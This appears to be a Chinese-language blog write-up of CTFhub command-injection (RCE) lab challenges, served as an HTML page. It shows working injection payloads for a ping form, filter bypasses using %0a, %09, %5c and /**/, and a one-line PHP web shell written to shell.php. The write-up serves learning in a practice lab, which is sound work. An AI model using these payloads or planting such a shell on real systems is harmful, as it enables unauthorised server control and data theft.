@@ -1,0 +1,227 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="google-site-verification" content="" />
+  <meta name="referrer" content="unsafe-url">
+  
+  <title>CTFhub-RCE</title>
+  <meta name="author" content="Willianhuanbian">
+  <meta name="description" content="@TOC">
+  
+  
+  <meta property="og:title" content="CTFhub-RCE"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:site_name" content="Willianir&#39;s home"/>
+  <link href="/apple-touch-icon-precomposed.png" sizes="180x180" rel="apple-touch-icon-precomposed">
+  <link rel="alternate" href="/atom.xml" title="Willianir&#39;s home" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/m.min.css">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <a id="top"></a>
+  <div id="main">
+    <div class="main-ctnr">
+      <div class="behind">
+  <a href="/" class="back black-color">
+    <svg class="i-close" viewBox="0 0 32 32" width="22" height="22" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+        <path d="M2 30 L30 2 M30 30 L2 2"></path>
+    </svg>
+  </a>
+  
+</div>
+
+
+  <article class="standard post">
+    <div class="title">
+      
+  
+    <h1 class="page-title center">
+        CTFhub-RCE
+    </h1>
+  
+
+
+    </div>
+    <div class="meta center">
+      <time datetime="2021-06-05T07:48:43.968Z" itemprop="datePublished">
+  <svg class="i-calendar" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+    <path d="M2 6 L2 30 30 30 30 6 Z M2 15 L30 15 M7 3 L7 9 M13 3 L13 9 M19 3 L19 9 M25 3 L25 9"></path>
+  </svg>
+  &nbsp;
+  2021-06-05
+</time>
+
+
+
+
+
+
+    </div>
+    <hr>
+    
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8EWindows%E7%B3%BB%E7%BB%9F"><span class="toc-text">对于Windows系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8ELinux%E7%B3%BB%E7%BB%9F"><span class="toc-text">对于Linux系统</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat"><span class="toc-text">过滤cat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">过滤运算符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0"><span class="toc-text">综合练习</span></a></li></ol>
+    
+    <div class="picture-container">
+      
+    </div>
+    <p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+
+
+
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>在开始之前我们进行一些简单的了解，其实我也是做题做到后面才发现一些知识是必要去掌握的🧚‍♂️🧚‍♀️🧛‍♀️🧛‍♂️🧜‍♀️🧜‍♀️</p>
+<p><strong>知识点-这里最好了解一下</strong><br>RCE分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：==没有在输入口做输入处理==。</p>
+<ol>
+<li>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。</li>
+<li>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。</li>
+<li>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</li>
+</ol>
+<p>其中对于不同系统的命令指示又有着不同的命令符：</p>
+<h2 id="对于Windows系统"><a href="#对于Windows系统" class="headerlink" title="对于Windows系统"></a>对于Windows系统</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span> “|”：直接执行后面的语句。<br><span class="hljs-number">2.</span> “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。<br><span class="hljs-number">3.</span> “&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。<br><span class="hljs-number">4.</span> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<br></code></pre></td></tr></table></figure>
+<h2 id="对于Linux系统"><a href="#对于Linux系统" class="headerlink" title="对于Linux系统"></a>对于Linux系统</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">. “;”：执行完前面的语句再执行后面的语句。<br>. “|”：显示后面语句的执行结果。<br>. “||”：当前面的语句执行出错时，执行后面的语句。<br>. “&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>. “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<br></code></pre></td></tr></table></figure>
+<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p><img src="https://img-blog.csdnimg.cn/20210531185857597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然提示输入IP让我们输入本地试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531190028865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到显示后，尝试得到该路径下文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531190212498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取文件内容信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;cat <span class="hljs-number">120731029228103.</span>php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531190322528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有结果，这里可能是文件中包含特殊符号，使用管道运行base64加密内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;cat *.php | base64<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021053119055310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>尝试base64解密<br><img src="https://img-blog.csdnimg.cn/20210531190811336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里还有第二种方法，利用命令执行写入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> &amp;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
+<p>因为环境问题，昨天还可以今天就不行了，但是方法是可行的！👀👀</p>
+<h1 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h1><p>本文开始前先贴出一些小知识：<br><strong>linux查看文本的命令</strong></p>
+<ul>
+<li><code>cat</code> 由第一行开始显示内容，并将所有内容输出</li>
+<li><code>tac</code> 从最后一行倒序显示内容，并将所有内容输出</li>
+<li><code>more</code> 根据窗口大小，一页一页的现实文件内容</li>
+<li><code>less</code> 和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
+<li><code>head</code> 只显示头几行</li>
+<li><code>tail</code> 只显示最后几行</li>
+<li><code>nl</code> 类似于cat -n，显示时输出行号</li>
+<li><code>tailf</code> 类似于tail -f</li>
+</ul>
+<p>==showtime==<br><img src="https://img-blog.csdnimg.cn/20210531192646843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据上题的思路继续进行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531192723973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>检索目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531192752601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先试试cat是否可以使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;cat flag_30210295964775.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531192837961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好吧看来是不行了<br>试试上一题讲到的一句话木马上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> &amp;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531193315676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag<br><img src="https://img-blog.csdnimg.cn/20210531193424176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p><img src="https://img-blog.csdnimg.cn/20210531193640916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>过滤空格可以使用<code>/**/</code> 或者<code>&lt;</code>代替</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-comment">/**/</span>&amp;<span class="hljs-comment">/**/</span>ls<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531193801505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用cat进行获取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-comment">/**/</span>&amp;<span class="hljs-comment">/**/</span>cat<span class="hljs-comment">/**/</span>flag_12333170278981.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531193941753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有结果，获取flag文件下base64密文</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|cat&lt;flag_12333170278981.php|base64<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531194622505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密<img src="https://img-blog.csdnimg.cn/20210531194653251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h1><p><img src="https://img-blog.csdnimg.cn/20210531201230521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题思路：<br>1、既然<code>’/‘</code>无法使用那我们可以使用cd 进入文件夹中<br>2、对管道进行使用base64加密</p>
+<p>按照惯例对题目文件目录进行查看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531201501482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>cd进入文件目录</strong><br>cd  进入flag_is_here目录，<br>ls  显示flag_is_here目录里的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cd flag_is_here;ls<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531201656332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>进入该文件中获取信息</strong><br>1、<code>cd</code> 进入文件<br>2、<code>cat</code> 获取文件内容<br>3、<code>base64</code>进行加密显示内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cd flag_is_here;cat flag_11328226429806.php|base64<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531202030482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行解密<img src="https://img-blog.csdnimg.cn/20210531202106484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h1><p><img src="https://img-blog.csdnimg.cn/2021053120381879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ol>
+<li>这里过滤了，<code>|和&amp;</code>两个运算符，这两种运算符在这里是无法执行后面的命令</li>
+<li>没事问题不大👩‍💻👩‍💻👨‍💻👨‍💻我们可以使用<code>；</code>分隔运算符进行命令</li>
+</ol>
+<p><strong>老样子，先检索目录吧</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;ls<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531204104432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就把flag文本文件展现了出来，那就cat 文本内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cat flag_14322672312813.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210531204314488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>哇哦，flag呢😡😡😡😡不要急，这次我们不用base64对内容加密获取了,我们来看看文件的源码，看看藏在哪<img src="https://img-blog.csdnimg.cn/20210531204454691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这不是出来了<br>由于对<code>|</code>进行过滤了，直接对管道进行base64加密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;base64 flag_14322672312813.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021053120532313.png" alt="在这里插入图片描述"><br>进行解密<img src="https://img-blog.csdnimg.cn/20210531205452687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><p>对于过滤情况的题，我发现了一个宝藏！！！<br><strong>url补充表</strong><br><img src="https://img-blog.csdnimg.cn/2021060119342447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210601193431757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>接下来我们来进行解题吧<img src="https://img-blog.csdnimg.cn/20210601193739236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到本题过滤了：<code>/ \ &amp; ; cat flag ctfhub</code>这些运算符<br>在本题中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、使用%<span class="hljs-number">0</span>a代替换行符<br><span class="hljs-number">2</span>、使用%<span class="hljs-number">09</span>a替代TABJ补充被过滤的flag<br><span class="hljs-number">3</span>、%<span class="hljs-number">5</span>c 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了）<br></code></pre></td></tr></table></figure>
+<p>检索目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>als<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210601195338456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>进入到FLAG文件中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>als<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210601200159778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">这里%<span class="hljs-number">09</span>用于补充被过滤掉的flag<br></code></pre></td></tr></table></figure>
+<p>接下看我们查看flag_324582491729512.php的内容信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>acd%<span class="hljs-number">09</span>*_is_here%<span class="hljs-number">0</span>aca%<span class="hljs-number">5</span>ct%<span class="hljs-number">09</span>*_324582491729512.php<br>在这里因为cat被过滤了因此需要%<span class="hljs-number">5</span>c将cat分隔开绕过过滤<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210601195957232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码</p>
+<p><img src="https://img-blog.csdnimg.cn/20210601200740771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者直接对管道进行base64加密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>acd%<span class="hljs-number">09</span>*_is_here%<span class="hljs-number">0</span>abase64%<span class="hljs-number">09</span>*_324582491729512.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210601201013998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密<img src="https://img-blog.csdnimg.cn/20210601201052437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+
+  </article>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="busuanzi center">
+    page PV:&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;・&nbsp;
+    site PV:&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;・&nbsp;
+    site UV:&nbsp;<span id="busuanzi_value_site_uv"></span>
+  </div>
+
+
+    
+
+
+
+
+
+    </div>
+  </div>
+  <footer class="page-footer"><div class="clearfix">
+</div>
+<div class="right-foot">
+    <div class="firstrow">
+        <a href="#top" target="_self">
+        <svg class="i-caret-right" viewBox="0 0 32 32" width="24" height="24" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+            <path d="M10 30 L26 16 10 2 Z"></path>
+        </svg>
+        </a>
+        © XXX 2016-2020
+    </div>
+    <div class="secondrow">
+        <a href="">
+        Willianir
+        </a>
+    </div>
+</div>
+<div class="clearfix">
+</div>
+</footer>
+  <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
